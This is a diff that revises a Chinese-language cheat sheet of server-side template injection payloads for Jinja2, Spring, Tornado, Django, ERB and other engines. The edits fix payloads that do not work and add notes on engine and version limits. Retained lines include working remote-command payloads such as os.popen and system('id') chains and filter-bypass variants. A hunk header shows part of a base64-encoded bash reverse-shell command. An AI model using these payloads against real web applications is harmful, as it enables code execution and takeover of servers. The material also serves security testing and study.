@@ -3,11 +3,11 @@
 _10 条 web payload_
 
 ### Jinja2模板注入  `ssti-jinja2`
-_Jinja2/Twig模板注入攻击技术_
+_Jinja2 模板注入；Twig 是不同引擎，不共享 Python 对象链_
 子类：**Jinja2** · tags: `ssti` `jinja2` `twig` `template`
 
 **前置条件：**
-- 使用Jinja2/Twig模板引擎
+- 使用 Jinja2；Twig 需单独验证语法与对象模型
 - 用户输入直接渲染到模板
 
 **攻击链：**
@@ -43,7 +43,7 @@ ${7*7}
 **3. 命令执行**
 > 执行系统命令
 ```
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+[历史 Python 2 示例不适用于 Python 3 字符串 MRO；子类序号也不是稳定接口]
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
@@ -70,7 +70,7 @@ _platform: linux_
 ```
 {{''['__cla'+'ss__']}}
 {{''|attr('__cla'+'ss__')}}
-{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
+[原编码属性名不是 __class__，不能作为等价拼写]
 ```
 **语法解析：**
 - `attr()` — Jinja2过滤器获取属性 _function_
@@ -410,7 +410,7 @@ ${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3Rj
 **字符串拼接**
 > 使用字符串拼接绕过
 ```
-${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
+[无效类型名表达式；不作为可执行示例]
 ${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
 ```
 **语法解析：**
@@ -795,7 +795,7 @@ _platform: linux_
 ` — 模板表达式注入 _value_
 
 
-**概述：** Tornado是Python的异步Web框架兼模板引擎，其SSTI漏洞可通过模板表达式执行Python代码。Tornado模板默认对输出进行HTML转义，但原始表达式{%raw%}和{{!expression}}可绕过。
+**概述：** Tornado是Python的异步Web框架兼模板引擎，其SSTI漏洞可通过模板表达式执行Python代码。Tornado 默认对输出进行 HTML 转义；原始输出语法是 {% raw expression %}，不是 {{!expression}}。转义输出不能阻止模板源码注入。
 
 **漏洞原理：** Tornado模板SSTI通过{{}}表达式执行Python代码。攻击者可利用import语句导入模块，或通过handler对象(Tornado模板中的内置变量)访问application设置、cookie_secret等敏感信息，进而执行任意代码。
 
@@ -827,9 +827,9 @@ _Django模板引擎注入攻击技术_
 > 探测Django模板注入
 ```
 {{7*7}}
-{% if 1=1 %}vulnerable{% endif %}
+{% if 1 == 1 %}synthetic-canary{% endif %}
 {{request}}
-如果输出49或request对象，则存在SSTI
+Django 不支持 {{7*7}} 算术；确认固定 canary 条件标签确实在服务端求值，request 仅在上下文提供时存在
 ```
 **语法解析：**
 - `{{...}}` — 模板表达式 _format_
@@ -861,8 +861,8 @@ _Django模板引擎注入攻击技术_
 **4. 命令执行 - 对象链**
 > 通过对象链访问
 ```
-{{request.user.groups.model._meta.apps}}
-{{request.user.user_permissions.model._meta.apps}}
+[标准 Django 模板拒绝下划线开头属性；此 _meta 链不可用]
+[标准 Django 模板拒绝此 _meta 链]
 # 尝试访问Django内部对象
 ```
 **语法解析：**
@@ -976,7 +976,7 @@ _platform: linux_
 ```
 <%= system("id") %>
 <%= system("whoami") %>
-<%= exec("id") %>
+<%# exec 会替换 Ruby 进程，不能作为默认存在性探测 %>
 <%= IO.popen("id").read %>
 ```
 **语法解析：**
@@ -988,12 +988,12 @@ _platform: linux_
 **字符串拼接**
 > 使用字符串拼接绕过
 ```
-<%= `i` + `d` %>
+<%# 两次反引号分别执行 i 和 d，不等于执行 id %>
 <%= system("wh"+"oami") %>
 <%= ("i"+"d").then { |c| system(c) } %>
 ```
 **语法解析：**
-- `<%= `i` + `d` %>
+- `<%# 两次反引号分别执行 i 和 d，不等于执行 id %>
 <%= system("wh"+"oami") %>
 <%= ("i"+"d").` — 模板表达式注入 _value_
 
@@ -1149,3 +1149,12 @@ _platform: linux_
 4. 输入验证和过滤
 
 ---
+
+
+## 引擎与版本边界
+
+模板源码与模板数据必须分离：把不可信字符串编译为模板才产生此类风险，正常变量输出不再次解释其中模板语法。先使用无副作用的固定算术/文字 canary，并排除客户端渲染或原样反射；不通过配置密钥、系统环境、网络回调或进程替换证明存在性。
+
+Jinja2 的 config/request 是框架上下文对象，不是所有 Jinja 环境内置；Python 子类序号随环境变化，不能硬编码。Twig 使用 PHP 对象模型。FreeMarker 的 ?new 受类解析器约束，并非任意 Java 类构造器；Runtime 没有可用的公共构造器，ObjectConstructor 也不是调用静态 getRuntime 的接口。system_property、Velocity 的 ClassTool/$Class、Django 的 settings、Node 的 require/global.require 都只有上下文或运行模式提供时才存在；不能从引擎名称推断可达。
+
+Thymeleaf 是否使用 SpEL 以及类型/静态访问限制取决于集成、版本和表达式上下文；#{...} 是消息表达式，并非算术求值。Smarty 的函数、插件、{php} 与安全策略随版本变化，所列历史链不是现代版本默认能力。Mako/ERB/Tornado 的源码执行能力不是一个可供不可信模板使用的安全沙箱；HTML autoescape 仅处理输出上下文，不能修复 SSTI。Java 命令字符串中的管道不会自动经 shell 解释，编码回调样例未验证。本次未编译或运行任何模板。
